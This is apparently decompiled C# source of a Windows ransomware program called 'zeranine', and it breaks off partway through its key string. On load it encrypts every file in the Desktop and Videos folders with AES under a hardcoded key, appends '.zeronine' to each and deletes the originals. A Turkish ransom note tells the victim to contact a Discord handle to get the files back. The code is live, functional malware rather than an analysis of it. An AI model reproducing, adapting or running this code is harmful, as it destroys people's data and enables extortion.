using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using zeranine.My;

namespace zeranine;

[DesignerGenerated]
public class zeranine : Form
{
	private IContainer components;

	public static int sayi = 3;

	[field: AccessedThroughProperty("uyari")]
	internal virtual Label uyari
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button coz
	{
		[CompilerGenerated]
		get
		{
			return _coz;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button1_Click;
			Button val = _coz;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_coz = value;
			val = _coz;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("yazi1")]
	internal virtual Label yazi1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ComboBox dil
	{
		[CompilerGenerated]
		get
		{
			return _dil;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = ComboBox1_SelectedIndexChanged;
			ComboBox val = _dil;
			if (val != null)
			{
				val.remove_SelectedIndexChanged(eventHandler);
			}
			_dil = value;
			val = _dil;
			if (val != null)
			{
				val.add_SelectedIndexChanged(eventHandler);
			}
		}
	}

	public zeranine()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Form)this).add_Closing((CancelEventHandler)delegate(object sender, CancelEventArgs e)
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_0012: Expected O, but got Unknown
			Form1_Closing(RuntimeHelpers.GetObjectValue(sender), (FormClosingEventArgs)e);
		});
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_005b: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_016a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0174: Expected O, but got Unknown
		uyari = new Label();
		coz = new Button();
		yazi1 = new Label();
		dil = new ComboBox();
		((Control)this).SuspendLayout();
		uyari.set_AutoSize(true);
		((Control)uyari).set_Font(new Font("Microsoft Sans Serif", 20.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)uyari).set_ForeColor(Color.DarkRed);
		((Control)uyari).set_Location(new Point(11, 139));
		((Control)uyari).set_Name("uyari");
		((Control)uyari).set_Size(new Size(533, 31));
		((Control)uyari).set_TabIndex(7);
		uyari.set_Text("Bunu kapatırsan dosyalarını kurtaramazsın!");
		((Control)coz).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)coz).set_Location(new Point(209, 173));
		((Control)coz).set_Name("coz");
		((Control)coz).set_Size(new Size(163, 39));
		((Control)coz).set_TabIndex(6);
		((ButtonBase)coz).set_Text("Şifreyi Çöz");
		((ButtonBase)coz).set_UseVisualStyleBackColor(true);
		yazi1.set_AutoSize(true);
		((Control)yazi1).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)yazi1).set_Location(new Point(12, 37));
		((Control)yazi1).set_Name("yazi1");
		((Control)yazi1).set_Size(new Size(528, 75));
		((Control)yazi1).set_TabIndex(5);
		yazi1.set_Text("Dosyaların şifrelendi! Şifreyi çözmek için iletişim:\r\nDiscord--->umutcankurhan#9743\r\nÜcretsiz olarak 3 dosyanı kurtarabilirsin.");
		dil.set_DropDownStyle((ComboBoxStyle)2);
		((ListControl)dil).set_FormattingEnabled(true);
		dil.get_Items().AddRange(new object[2] { "Türkçe", "English" });
		((Control)dil).set_Location(new Point(420, 13));
		((Control)dil).set_Name("dil");
		((Control)dil).set_Size(new Size(120, 21));
		((Control)dil).set_TabIndex(8);
		((Control)dil).set_Tag((object)"");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(586, 226));
		((Control)this).get_Controls().Add((Control)(object)uyari);
		((Control)this).get_Controls().Add((Control)(object)coz);
		((Control)this).get_Controls().Add((Control)(object)yazi1);
		((Control)this).get_Controls().Add((Control)(object)dil);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("zeranine");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public string EncryptFile(string plainFilePath, string encryptedFilePath, string EncryptionKey, string SaltValue)
	{
		string s = "Bla3212EWMND12es";
		byte[] bytes = Encoding.ASCII.GetBytes(s);
		byte[] bytes2 = Encoding.ASCII.GetBytes(SaltValue);
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(EncryptionKey, bytes2, 1000);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.Mode = CipherMode.CBC;
		ICryptoTransform transform = rijndaelManaged.CreateEncryptor(rfc2898DeriveBytes.GetBytes(16), bytes);
		using FileStream fileStream = File.Open(plainFilePath, FileMode.Open, FileAccess.Read, FileShare.Read);
		using FileStream stream = File.Open(encryptedFilePath, FileMode.Create, FileAccess.Write, FileShare.None);
		using CryptoStream destination = new CryptoStream(stream, transform, CryptoStreamMode.Write);
		fileStream.CopyTo(destination);
		string result = default(string);
		return result;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		DirectoryInfo directoryInfo = new DirectoryInfo(folderPath);
		FileInfo[] files = directoryInfo.GetFiles("*.*", SearchOption.AllDirectories);
		FileInfo[] array = files;
		foreach (FileInfo fileInfo in array)
		{
			string fullName = fileInfo.FullName;
			try
			{
				EncryptFile(fullName, fullName + ".zeronine", "URJOtBT9U8kuYp5EU%lROswqHxPu*Qe#3zd#NR9H3MQaKvq7DqvJwcyb3!g5u*BE3Q17lBzD6EXCCWgUHqRq#$GzBCAUKDu4kMG@4SuCzSlsnw8guVXdpTJ*ja%jaF!@r2zypmyX5PZLSWMND29XORO0DhS3VLBUZrau%Jzh59ha@7oWXSgHfEnan8VI35CTnFUAVzQ@C0!oJN7F!5fDe@oVEAg&WRnA&wVXMOB6bmFnL8zABQP7y8oUy*5VssGtm1qu0J!m#iB0XaKeig5GbPK*IB7nSOmRgtBTqFi1XcDp&w%YX0MMW9r6qSmZkn#o5StD8zWd&ER8M3atEiZ0CA#gCEC*!SpjhXtnD@y&EiOSqStWR!uCwDm$Xma#XxLOXh0XJvqkS!W2ULysTOp96NVeKxyy!$iP&A4i15N$Kjs4PtKMwqKihLqjVVNt%0SwsH4UQp0XatxW#zxyNmCKt9HVrtWFR@8sz5LIYy5gyvIwv#P46wGsxhcsAic52ufHuF%*OpaXq$t70s9we!I3vP#r2!Ipv9NEQabQ7qPQWrC@We1pJO0amLUfkNFvHTBqqpqzRrywl0gEma4XA!ghImzeP5fTL@iDQtlgwB*zYdxVeQ!jrqvom@iEylKulFLrRDW2xXA*@PSEXeA*D5b3G@ZwLhQLZMOs1fdB@9U#QXV6KEPUllRpdqLXm9QQHxhQB8lra*FdKHMrH2Mg158n#7oj3oX@rEv!Pe5k16TNGNF%e2QTvjxLY@VcsbXUjLuGttcc6bO#LuHQ2SFa*dghokcvS@0yi*D4!8lTZnWU4#9duFja%WvfEm0iRpsdKxuMrMX3guKtQumUL8amsz@ul6ZOHcCj#sKfIWUiQP3KMCxSAG&roftT4AaUViVdSAy&kglXN0%D%SIJhHOBFs#X*zkIv9Wh3y0ll0H@3iewJQWl0zmn3t79fb*t5dbNEXiG05&QAuH5OGnRD*Q$vINJ11GK!W&ZHzsuhpU4@5nImbt8WQQ6vfz$K9O8yvxmXqxwW2JWmVCZ#e%yggwkfADB9wKIBuFGHBt$m6l3H@TaDaBFDY1r*mgXNWw8rBu0p5r@talj#3dlpc78vFFl3vH#35qyJmLGH!THRHtCMRweJ#hkYXlM$J&3XX9XSvaqR&EwrZqotc8l*Ct9XGAUa*K7#ZS@h%SZqGvlyT!*g6!2Ku4udA9MVoQsWG@!HwgXsi4!PIJEnBnDfqwI46yh%GdbYDYSZ90SyEibzcf4Z$*tBmmFSt&j780Me2clsZNnj4NbIVR!0#qBhsalysAfCqtzM5%&9@LAqTKf9k66CeSdqZEu!Zv9ZhL!KvYlYT2&rqsXI#MnvDD6*QiV0kFigLjihR$MVthrlUUAgpM&NhmWeO33NDtNOsZgHKPZ8A!b4UUm$iok*H$8*WE@Xb8rA3D24n!5AV*Nok1T@p7EXJogXzhtfvC&BJbBq!RqpSKMiRTW4tAHD##zO%EEfhZNsaMFJZcB*pwe*C7GgUYuv43GoKVUwNkI2%2henmEq*ivGy1l776UrE0xGfZ8EqmtFOlCJyB2HtdwVgAYSJvYQZZxedb8wnAAuXq0mYcI6Em&Adc8FaP#4Xdoxw6FXbe@tdC&yil@gn!MM!XaBC3v7fe&tCCy16T$8sm5beJ%xVWQ50C58%EVHR4n8emwGVbj3%m@o!85!&7lrXB@AGz$!7wQX*661VyctMv8Nipg&I@jTS5KDTw9$fR5i5ep4bdGH$0fbCozyT7TEN6Fcv3h*yHn4zZqEAL$EWCX1ZiaE%jkh&0$88NIh5hRXMKKl&vyhCoqkINMN@DCP5G69#revDwIOtAOo7XGJTcFrJTZua4n!fb1GmkqORDeOgCzI*&oe%!$2BOyK!SuhiPirhIbvG01Q7Zkg2qvDoJ$mf8e*ugv*q%Fz@hAZ$27eaO4KDSqK5r29T5MiDDB9e28BttNUq%hvkzl0E34cYLc8dfG&$zW107Aho@ySe%@9jGX@sUeiI*K2ZA&ONpyZiP4MZElKEL&2rcx&qMNjVNs2wgRo5kFxgcz#kLDOi3e%BRKWkA6aCoE45CYsv%O2GIuPl#vfJ8B1iW0f%#E5NEv1*$7Ivs!loLZ!5#kpN0zDNluiKSW!!SobV3qp5NsyGYM&%8JbSwrVNSNvJY&D%As%%XfCm4t9ha%x8XlLJUieA2XcP4Ggpp@GFpaI2HXwDrnMvYWUMV@LzO5DAcVrXNs1HySSwdrC%UbqOLpZHU3#vqozT&hZUf8y8ve%GE&iD0OFMnxxv$KDsxFyj1*y$!QZulr1GsTDWtz4CjNfIsDy45fjqOVnFHmkKXsa5%RcLgP*7jwAN2qlx04YfhK16F7PHPtnZmjLbaNXpglg0VaMZBvS@34XuZFfiA0ryJjaSFKwmgi*$dAkeUYf2Bt5Ruyk4hOpP@QRL93tz*fVU5!Ry3BwKuYxxnr6P82F!!Sbvr9e0EO#$*KV@huaGzf3E!@&q%e1fA@2MZ4g#55fG#2yD5DHm1*bVY&3Ybw49Wx4FRJDMOGj#9wJ9d#U@6ONb1GW2BR2IBGsF7TuvA47UXgvbw#uHcBChk2mkVjk6mb@@ddBsi72bp!mUTueG%uf9dk#eGjAysBhvN2&s2b*EIa1ro!zaFea15@y!J%M*7DrOtzg0wuN#WB0DslYns9tOaPZTcFj%Y9GFRM&XU9Mszfe#CvI6g*o7rDNeaWXrkQeW4VUgOa2sWaX#K5Rp%mYzthvO*!w7k#IjBR9PBbrff$kRos#EeHu70nCv8fhVM#h!!n@!5bO4#StY6e9o7S@dijrvPmQ$35@kWrYBybIc2ZDI@mY#G!w3aEsR$gMSUsB7yJbno*y%KZKrGj@cwVYBI9KS8gFSxYqiYerTLkOHc0Sj@aLuNj$*#AyZ8roh2GHuiB@B0izMgq7qpAY7$sFO3rOxo1U2$gn5s6B1Hj#ESS1MbIj*@qlJB!1ZvEV9X7QAcb&S*6ZUYa$KzbWGRV9n#e40FkFDX#ptb0jAkzA5zztA%Q8tqoRb*cF&GGNW1W6#tki81v$zuDwDt##xlUuIMnV8Vl@emmED3youH9!#TzP4OCmlLxkGBxRGxjmo@zNI8tJ#OIQl!0xV7zTT*q2Xb&behi%&VMB@MH5#!r6DH*NjA5h7y@QL&YgBrEvfLsyoy4iz#Y0PtYpDs0eLa*H25Y$Wa4lw5z1XI*tevqDACa0IiDqz9kemL6SA9uZ9mDT@&1#Ug9xs4gz$7Wn6mUXtVOMLoTFB0dv*p7KQi5s9VuREGwClg@V!o8gSoSfW#w!0T!o9l&wQBX*a%hF1q237q#SQz1BZZ%F*@zTNhc9iFF00aGVgmnfB@3Jyi7It%6zerAHfw0sn@t!lD0ptF3MlZEe8Q#ej3oMhnviA*PSV#0HIb&vRRXOCtnnN4IY@vitnhT&QrPuyKzq*%%6Shv!FAjwAh4eZzy9UG@aqAf8bcY1@6oQ*kfu9QoN&%&IWk4*U05!D$oSbWZckr3c!NfOUd9E0ocUC6lzHzgCaWND5vslzlcoC#PiePmQ01aw2#Qek94tL1CFAcS7twmoMwrhQcu0mykIvZjBfnazQrDK!Kib6o%dnUKeLiXhNdguQ@rJ!q!fvv73Thof3T#7@g#BoFy6Z2mmkR3*18iovZQ1WQtd@Rn3ii1J8q#W1$o@JtSCNQn4KOkDyCn*tudIOSdbyt9KEVW0kWrC&rylDss#7xs%D5Cf0GOZQQM@qDZX1s1cTLaC$0e$9JdaacHIsQ9EI1uQF%4A24cn6QM04AKABsZgML!n5qEKsW31Zs%85eCegYdTyPmsG9DxBnd3EpdLZ14JvtBLDkd%quAwhhXPEUdsTeZLoc4oaZnO##&FObP45GHonpu5!wHeXkYq#Y5apX$zHU@mKSBCFIwm&K68Q*WmSizSFPKYfonHkQh@WIuive9oWLTs1%sRBrH7#jh#hL%y#pCpcdlImNZNik$@506i$%f2iJ*MAzBKIJUgJDQXtKEW1@YSnn*pnw#&jiH2F8IvMoF8ZxT2KiXU1SBPtP7u!t%toW%A5wSUCRjlwy!Y3Ffe8if0h0hYav3!SUTc!T%vZcrJIx14WI1vn0ufqF!EP@tPXq2cFy6jISO5z5rS9MC14Hn18Nuv0!g6rcuz$xY&LqN4lYouWJEc0!tpDBd1EKrplRmwj0Wkwepm@SoJ799RwEfZReW#U&@B8&S#l1k$V@oVlHWtu33EKA!hLWFFd2yZLoN59t&fxE$#xsnKRcIzDxZ*ekrxvf0@DYK%@zUB5wofE7S!i4WBT8vvxo0XbIsSMCz9IqQ0qH#PiT3G!ZP1rZiEcXhn9%8wE%@CgSs1N5TMEGmEut5L20Av@v6tic0tIgLMz18iGXNVG5A5Kd2OaW4M5gitu8rkE8E64am3UveENnP6VBJFJMsUl*psrnwgFcqg1cajZ83nRZ8RzL*tymB1oSt%T@kG8&8k%IeSa9OKrecV972GPcq!BY0IrEy%wWotzXuRgoTZ7zJKp*6VaEZ5pgJgq%a%JRv4Yr4kMK9aS03KPQ!sgd5s%sdTnnaKnwpPdnU7DuiyEymxM8zAdqYfVD*fnK6*jYv4KNGb5#pu#fOgfoHOwAG6*K3APOs2XKPoDRN8!xEJBDkpX098DRkJrY%ATfVQKw6Ty9dwBhV*5%549mlXOTYG9G%NuNovcw8NfzZXWl745lmV@BaG3&bZ7ztSDyCW29$I&rxIWwacV3KW2jtTmi!euIoofgU&JkC5pexKl1sf%*Edp&Z2FRJsgzvxcJCPCD2k1nGXuJhUyvhWEk*IQ!11BrxyRAHcYDd@F2lb0bg5jx3tS9T1K3*JLBjiypfube5VSOqL*%Qou5RMXdGrPP14e3qESDlK$u3e!hbErI2NmSXoS&tuJwFumaQx6M!$tfs9bMTpbC9HvNRuFCUurZBHPh11zmgFP&@g9XmGmETgX788r4s41GM3eLT3U!Yx430xtkVQxOhnG3sRi!i$@lNiU8CwEsuUO4l3GjOHiCGM*7wk!bt!S@4SpRdUi*Me@W9kRyk8NBv0faKvLz$C82bUA2NxG@*KYBsk*l@czunqgdMogQJRDKfAUnkxLv!tcLbEq9X9&!LmOtn5P*qYsQHO$sZtaezE23O4bh&H2jtK8!uaAoImeDaVEWi7Jd*!bgTtfS#haj%J56PD&Ytu5m9y22Zn89&Yk1I1ha#QtaM#GzyHHfATSm%xH#1M!PIBMH*EXw4%#Da$aFsbcSg@8Nf&$TtNiRXE1kR8!ussKdYPlawCkyjJiOC*baIEDQwMO%DYwTJq8Wr$Xyu#5RcsHO$miS&0MOp3PlaP&*OzP!ju%GKLonhUnEFAaZpEvrETgxolYf6&DlDOEJQChul*g4oLgaOHrjd&XyOH0*viqKRbBZ50JN%BffmLiDexzYo2hFzn#iKJ8cQ5mNKpEw7ENc1RMD7w@&r1$x3$8q%AcvbcxQ7$2XTD0KoFNib0kWpBtYaxTOqW0&b0ax2$FC#eNoAtiXqZPFYPfAr9piLNg6l3iXEYPGuI!kwFYpo$&zgVIuUaf@O5zQ&pDGkUs!KJspW4lmjA3pppyyUWDdSV0yRLmgCre#LeP6C17yX2SOCKAqzmuwRPixr3*LqFK149ELA!w2YmoZclwgk5pY6qM5$zOI@vISR0TCGxQ7y!*EaSVff1AUxu#NWhPiNO9CE5hk!UavOr9erh$MeICbVw#56fo7iHTK25AEKKNUzmfGVy4OMcEel7pQbLnVFcNH7xlVhzb3#qKIqXjgKaufDo*#PSC8%1PX9*h&NiguBjj4WH9NbgkeqhdSZqfYxc&CBvirPl2b@9e2edgIsx6YQkG1#xH%cR67Mh@a*Q&YnikqDknvj&FAFhuZPqwze%*LcGP6jGjCzHkh9YxsKUVFl62eVctq2GTqj8O%$qlDWDJ&%NZz!EpTj@9fNkKHV2iTw3&aj1X@ISrIW4hIl@xXZ9gQ9iStGEQ#3yjcPypapWL0Kzrrcb4!Et@wvpBBIDvdbwn&te2VMwHcXPfIZaqeJxyJ5vP9xo!MAHYWlt7&iioQMZ8gj!KhVR#m7eb7Y@&&44cQZS5fCs$aii%FWiY5EtzrMlxHrAIPkRuRwRQ0%eFCV3ExI5KpdB@KdTEN3xWCkPY0wnqF1799Ox%rhA*VY!LjxKndND6HqczGemB#OFXfB@$oWuf3yaMSdOcMAN0xa1Rl&yN4*EHTdFI4o*p!&cRpZhCyKx3aN9eiksR&hk4u@!O7GH6B68z7jBVYwwTjjGGda8s5pSTvh5W&@Esc0!DOIg8j&2JTztkvVK&gXBUnOEZnnX$SEqSqc1$@AJ*wiA5WtaLrGMnyHY9EQU$i6ZPib3s#oEGOc6eOIc@mMmM0c2jN10loNYzrTvuzqQDCf9WKTt$N0r5TNXfITFCX10amGv4Vqc$$JKUcf8@H$7w42ge$pMgLOojO*Jd&yJ%xvajDDcCtl#!3Dft9R8FE$TQ3afE%$5qVb*h!%B!NKV9TWPL2xEozE12cTPC6*fYPmf!E&!cpG03JT%gt#kHzpzRJfFhp*$OE6sgQwg$%B8TM7sSwIRcw*79VXr*!TvqkMylAYZ%WPKYqGFLVVtHQ!0f8Tt2eIDMOqI9Igr7rUoHwIRorglf8OarUTmpE61OM7K9&FcOdvY$msRZbFj&56NAQZnx3C3U@a4y7rRmd&ClyeFbbvn8W3rotjSHznUB2dClx1!sW6@*4BKLtMvgX#79rPFw9jVylasVc@mj#4LZATTS9gWn1Nm7FC3IVEsmKdV#qXI09lM2rh87$Vw2WH&7WUpA8Ewyk*o5&yBk7$OoBTo&D$M9pzZDGwg%hI14xvRT2caftl#02R6cFS6D0withlyJreDyDszOC$EA4gOE5*jXzdzxkxDam6LQm0WPiewi0rajn%ItIeXJbBrOnnnOPyBFswvdT84zka6IDpjnPS1hICOlIIB#zI2BQ$zzjeaij&7aEjL7d9*6&2%QIK$k7aACH$0hYsEkrS7kENh76cZ0j5Dw*jr8JYkJ6$@IrDit4wnO#UM#c6n4ji!k!dioBeB@HxnIt8P@3f5VRX2N6w%lKP8XDRpO#@syVUHfgEjDqUBEMG@dK4RmIYS1yyecSa*AVfA6QWg2N24YO4L6XlE8LGq6bopQ8HtpvaRGG%WWXx8o3@M#nhng%8xPXc4Bgy3GIncnmez1YQkvgCchCucz2mTWLbRDbup7#2Goz*QiqvRoXbiV9v*UWcm$3PCLvWyDaM1N5Wqde@JG$E*J!5DOv4k1okUk%Fv3%nOkJ4ZlF4p@@g9yQ!SzskpFBA*tbfg8gojQyWA6fzi1OR7Ik$3dV$ju7JJJ%Fj9wQVn6S9@!uU2bxZsCyJfLDMkFXSpmZaAQJd75TL15aLaKqsiSZgg5dwtdKiIASpbUtL1U!wrnqjk1laweJ&Ws3EMVS3ukD1MTJPZF0Xzcx!n3M21jUdZu@r0p8fb7Cgky6zR%jRmugT#BZriZCky8bzz0xjfuV!aqqx%uK$9cZeOiwyZQ%L5zqLwGAzhAL18nsmsBVwogLvI%LRd*TYxK%JAfaZUTW80*FaYKfx4i%xO#cz#rvipVDXRJMNa$C4sl$j0k!2!4#onH#fcJ5c&nre$qrP&!w8GBFc*29SZ3QU1wjKOgKz89&F@znJ2l$AH$iMb1gjJmMD6&mhghazq69gdAihnyZN*QN5n6IvAAQVv3h5NGCtkErK$CibS*5TW8epsQ@j8NZqPNTJ1m#HWFC37DalwgdBd68wx1l%M!u6NB#RR8jfEX%q%kRpPqV!jYmrn%UAa&44TeP6IS#x%76PaqzNJ5Q$f2WxwlDUnjeG@B&0$UH6v&$L1&R6fHZEQ8Yzqzi%PJKv@zV8T8rxxTII&L6Z3Gogsay3lGjELkQmWirBkSMGxbP%zp@f3SCJ#dc!a!vmYNMNc$UX@$Ok@IRRt2D$mdj!IHSSfyaS58QKxC@44el*d0PuuUhHxzAUdTe$Mbrd45o30g2r8hAh0LxQ066UR23e8$gE67r2vIDHlu3O1YIQZ13!$Xdoe&uCCj459xUByguShQefDr2!tmOgbOii#cXYvBFCz7ODdgzSGKTnS7lVE@RY$w3UPlGvS%5GLcOeDyXmV$a0##y%zCU@spGcE3W1aEAjONCpSgSneEc9WczUVj$pkCW$5laic%MR4zlQ1JmsSGxOmgPbDCFZIs*MZgTgGJLh1Ue5ZJ2M%L6emhrY5*fA0Vik19ZUYGmJ4Qv1bTk@i!@%v38Rx4kHdkpfl@dZShwZ*wJ%UZWlwl0*!lx7ah53$FFTAQPIPtjaeD7*Tc%7H*T0sRmAefykL@#2Ry5EKO%cbZ3YNZN&k7v%unArdoDJ#8YLIep#G!w2CQY2wwVn1!9Ng&HdYNa4kvhcBrpiJszSK3#Exg#P@YRC9kEk&le21!qPiv1FHmehBpDMDDorStbVeFcZNFL6O7zRln$boYhptJBSh1H36Vjgz4kDTb0bbH@cYUaxhmD@lub4EsRV7qA!wT0QD1RN7GnMp73vzrVTSQ#F@P8AsFdTgaoF3sUP4Y$fgxOfy44o4PigYVww2q3!C#FPSX2g6fx3Ux7EB@KXjxx00IPh5&WN4cdMS*vBCXRx0ouawSV9gfrNFnXKIUk9Sk*rtuUCGiVVG99LvoTmkWGYtZHEKl2QMrfpQDPb&T27s%gFOlw2a&x$eJ7#nQ13PFiX3s4S8ro0#hFwsCy7X9Po3jkgFuwQ!8rnWrk4qe3rr6B%djklz@FPY3#TIwNm#**4y0aaz4psf6%%InD$jkZ*@Cx@wzv@zpws7GgMJjU$muj167k3trDsIABwCgM9IW2Yim7CHZuAy#uh1%5Yo2iImEk7esjC6UWy2USTAiV3%c@NO@$FKwToNtLeb96XpscEH$OgNlYGGOLjk6SLwE0JaHLIinRAl7NmAxGsOx1*7Ni8Ib3EQuAL!2D9sG&9#x3IB*JVz8%8M2LW*M9HtmsZ&CtHUGAhz1EiTa7J1HNqxB*9qpBGGZoQFDK*NCaT8xItXCc7OZPM9bb%DUZEF@bAMWdpy85YG@rA2NkOmD1pKCqdbN4!l%nFvhhB7vho#ZGfSBdyjkzCbuyjf9nLdDmjoMNUFJQz4lVt5ktAjFraFlDaR7$*I5kzM5zfwSTa#Agy9FN#oNb*tMecJMcHnrR8a4HAtnl0uRGeeNBMTaS#3MfA0w%kplVlrhxe&NjaBKmcf97$LyWm8wewxHI%qBKi$#v6Y5oGzr2s9D30yB9ZxIm4capyFmSA9EHLmBGoKQvp#uXuNQgpbtTvq13XPYam82s$$RNX4TohV%AQM4lXGc*oTt#ugr8uPiqbb!y$cruqelAt0MkUMMg5#EkKW!qMt31mO*OTeQUwqQjhtJ#3gniDbUg&qOhKaI%KtWF2&zP50SON3DZm&WFGUXk30qcZIKvIT8w&Eb5P7MlSG@DnX#MNDZy5LLBpXywQ5f@#o2i50Yhhl!w7NxbN&iF@J0u!AP0hY$vA9I*$upVNRqTsXDC9XJSWa9UXHQ$L79SQfW7eyf!Qv0k1gCE6m1Tol98AwjXEUKPR*Dmae6jRqbAiX2Qel*7fPDEGX7qoRw5lL2@dxd1pRC7K8ZL#@S1vMJC$8gMgP#93FX&$9mpIGRXNe3g&VvV8$J8bz&eqztAWCdek!p4PcsP4UxZeAOU2ha75x$ECI*RuqBkBY$Ff1f5l@EQbg9ql9HOBFIv%L2HEB#mTmYPEiOBbeVCTOC4iQFujVJ$piI#8*1K8z6xRsMcUfm%sGCRi&*W5ID&D38$ATCcmLc@RNmYECadimLjgzUBAEOzw8UwtqCaDjshDi94tiS@h8xZRYxJ8BcI6lFS2YeW99A*@dg&zypzUUrxj#f4!2bCHKkzDQC$E5@h*y6NrzritLwL@QI*SJ#g770S2P#jwUvx1KyT&1MbK2R$W86vIDl4bvja7nUC%IU8x*TSzXB0625eP5$@rhbti1WFAYusgjeC", "M6yaS6B&");
				FileSystem.Kill(fileInfo.FullName);
				if (fullName.Contains("zeranine.exe"))
				{
					FileSystem.Kill(fullName + ".zeronine");
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
		DirectoryInfo directoryInfo2 = new DirectoryInfo(folderPath2);
		FileInfo[] files2 = directoryInfo2.GetFiles("*.*", SearchOption.AllDirectories);
		FileInfo[] array2 = files2;
		foreach (FileInfo fileInfo2 in array2)
		{
			string fullName2 = fileInfo2.FullName;
			try
			{
				EncryptFile(fullName2, fullName2 + ".zeronine", "URJOtBT9U8kuYp5EU%lROswqHxPu*Qe#3zd#NR9H3MQaKvq7DqvJwcyb3!g5u*BE3Q17lBzD6EXCCWgUHqRq#$GzBCAUKDu4kMG@4SuCzSlsnw8guVXdpTJ*ja%jaF!@r2zypmyX5PZLSWMND29XORO0DhS3VLBUZrau%Jzh59ha@7oWXSgHfEnan8VI35CTnFUAVzQ@C0!oJN7F!5fDe@oVEAg&WRnA&wVXMOB6bmFnL8zABQP7y8oUy*5VssGtm1qu0J!m#iB0XaKeig5GbPK*IB7nSOmRgtBTqFi1XcDp&w%YX0MMW9r6qSmZkn#o5StD8zWd&ER8M3atEiZ0CA#gCEC*!SpjhXtnD@y&EiOSqStWR!uCwDm$Xma#XxLOXh0XJvqkS!W2ULysTOp96NVeKxyy!$iP&A4i15N$Kjs4PtKMwqKihLqjVVNt%0SwsH4UQp0XatxW#zxyNmCKt9HVrtWFR@8sz5LIYy5gyvIwv#P46wGsxhcsAic52ufHuF%*OpaXq$t70s9we!I3vP#r2!Ipv9NEQabQ7qPQWrC@We1pJO0amLUfkNFvHTBqqpqzRrywl0gEma4XA!ghImzeP5fTL@iDQtlgwB*zYdxVeQ!jrqvom@iEylKulFLrRDW2xXA*@PSEXeA*D5b3G@ZwLhQLZMOs1fdB@9U#QXV6KEPUllRpdqLXm9QQHxhQB8lra*FdKHMrH2Mg158n#7oj3oX@rEv!Pe5k16TNGNF%e2QTvjxLY@VcsbXUjLuGttcc6bO#LuHQ2SFa*dghokcvS@0yi*D4!8lTZnWU4#9duFja%WvfEm0iRpsdKxuMrMX3guKtQumUL8amsz@ul6ZOHcCj#sKfIWUiQP3KMCxSAG&roftT4AaUViVdSAy&kglXN0%D%SIJhHOBFs#X*zkIv9Wh3y0ll0H@3iewJQWl0zmn3t79fb*t5dbNEXiG05&QAuH5OGnRD*Q$vINJ11GK!W&ZHzsuhpU4@5nImbt8WQQ6vfz$K9O8yvxmXqxwW2JWmVCZ#e%yggwkfADB9wKIBuFGHBt$m6l3H@TaDaBFDY1r*mgXNWw8rBu0p5r@talj#3dlpc78vFFl3vH#35qyJmLGH!THRHtCMRweJ#hkYXlM$J&3XX9XSvaqR&EwrZqotc8l*Ct9XGAUa*K7#ZS@h%SZqGvlyT!*g6!2Ku4udA9MVoQsWG@!HwgXsi4!PIJEnBnDfqwI46yh%GdbYDYSZ90SyEibzcf4Z$*tBmmFSt&j780Me2clsZNnj4NbIVR!0#qBhsalysAfCqtzM5%&9@LAqTKf9k66CeSdqZEu!Zv9ZhL!KvYlYT2&rqsXI#MnvDD6*QiV0kFigLjihR$MVthrlUUAgpM&NhmWeO33NDtNOsZgHKPZ8A!b4UUm$iok*H$8*WE@Xb8rA3D24n!5AV*Nok1T@p7EXJogXzhtfvC&BJbBq!RqpSKMiRTW4tAHD##zO%EEfhZNsaMFJZcB*pwe*C7GgUYuv43GoKVUwNkI2%2henmEq*ivGy1l776UrE0xGfZ8EqmtFOlCJyB2HtdwVgAYSJvYQZZxedb8wnAAuXq0mYcI